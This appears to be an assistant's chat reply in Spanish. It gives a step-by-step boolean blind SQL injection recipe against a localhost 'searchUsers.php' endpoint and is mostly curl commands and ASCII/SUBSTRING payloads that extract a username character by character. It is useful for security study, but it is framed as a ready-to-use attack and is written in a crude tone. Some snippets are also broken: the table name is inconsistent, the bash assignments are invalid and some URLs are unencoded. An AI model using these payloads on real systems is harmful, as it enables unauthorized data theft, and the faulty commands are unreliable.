
---

## 1️⃣ Deja de mirar el status code y pásate a contenido

Tu endpoint está hecho mierda para usar códigos HTTP como canal.
Vamos a usar **tamaño de respuesta**.

### 1.1. Saca la “respuesta normal” como referencia

```bash
curl -s "http://localhost/searchUsers.php?id=1" | wc -c
```

Apunta el número, por ejemplo: `8421` bytes.
Ese será tu **valor TRUE** de referencia.

---

### 1.2. Prueba una condición falsa y compara

```bash
curl -s "http://localhost/searchUsers.php?id=1 AND 1=2" | wc -c
```

* Si el número **cambia** → ya tienes canal booleano por contenido.
* Si es igual → prueba otro patrón (por ejemplo un id inexistente):

```bash
curl -s "http://localhost/searchUsers.php?id=999999" | wc -c
```

La idea es:

> qué tamaño devuelve cuando **no hay resultados**
> vs
> qué tamaño devuelve cuando **sí hay resultado**

Cuando veas que hay dos tamaños claros (ej: 8421 = TRUE, 7900 = FALSE), ya estás listo para enumerar.

---

## 2️⃣ Enumera la primera letra del username (id = 1) con ASCII

Asumo que el PHP hace algo tipo:

```sql
SELECT username FROM user WHERE id = $id;
```

y tú inyectas en `id`.

### 2.1. Payload base (primer carácter del username del id 1)

```sql
ASCII(SUBSTRING((SELECT username FROM user WHERE id=1),1,1))
```

---

### 2.2. Probar si la primera letra es, por ejemplo, `'a'` (ASCII 97)

```bash
curl -s --get \
  --data-urlencode "id=1 AND ASCII(SUBSTRING((SELECT username FROM user WHERE id=1),1,1))=97" \
  "http://localhost/searchUsers.php" | wc -c
```

* Si el tamaño **coincide con el tamaño TRUE** (el del `id=1` normal) → la letra es `'a'`.
* Si coincide con el tamaño FALSE (como `id=1 AND 1=2`) → no es `'a'`.

Repites cambiando 97 por 98 (`b`), 99 (`c`), etc.

---

## 3️⃣ Cómo distinguir TRUE/FALSE exactamente

Haz esto UNA sola vez para fijar los valores:

### 3.1. TRUE conocido

```bash
curl -s "http://localhost/searchUsers.php?id=1" | wc -c
# Ejemplo: 8421  ← llama a esto TRUE_SIZE
```

### 3.2. FALSE conocido

```bash
curl -s "http://localhost/searchUsers.php?id=1 AND 1=2" | wc -c
# Ejemplo: 7900  ← llama a esto FALSE_SIZE
```

A partir de ahora:

* Cualquier payload que dé **8421** → condición TRUE.
* Cualquier payload que dé **7900** → condición FALSE.

---

## 4️⃣ Cambiar de posición (2ª letra, 3ª letra, etc.)

Solo modificas el segundo parámetro de `SUBSTRING`:

* 1ª letra:

```sql
ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))
```

* 2ª letra:

```sql
ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),2,1))
```

* 3ª letra:

```sql
ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),3,1))
```

Ejemplo con curl para la segunda letra = `'o'` (ASCII 111):

```bash
curl -s --get \
  --data-urlencode "id=1 AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),2,1))=111" \
  "http://localhost/searchUsers.php" | wc -c
```

---

## 5️⃣ Si quieres ser más eficiente: búsqueda binaria

En vez de probar 97, 98, 99… usa `>` y `<`:

```bash
curl -s --get \
  --data-urlencode "id=1 AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))>100" \
  "http://localhost/searchUsers.php" | wc -c
```

* Resultado = TRUE_SIZE → ASCII > 100
* Resultado = FALSE_SIZE → ASCII <= 100

Con 6–7 preguntas así encuentras el ASCII exacto.

---

## TL;DR operativo

1. **Define tamaños:**

```bash
TRUE_SIZE = $(curl -s "http://localhost/searchUsers.php?id=1" | wc -c)
FALSE_SIZE = $(curl -s "http://localhost/searchUsers.php?id=1 AND 1=2" | wc -c)
```

2. **Para cada prueba de letra (posición 1):**

```bash
curl -s --get \
  --data-urlencode "id=1 AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97" \
  "http://localhost/searchUsers.php" | wc -c
```

3. **Compara el número devuelto:**

* Igual a TRUE_SIZE → era esa letra
* Igual a FALSE_SIZE → no lo era

Con eso ya puedes seguir enumerando sin comerte más la cabeza con los códigos 200.
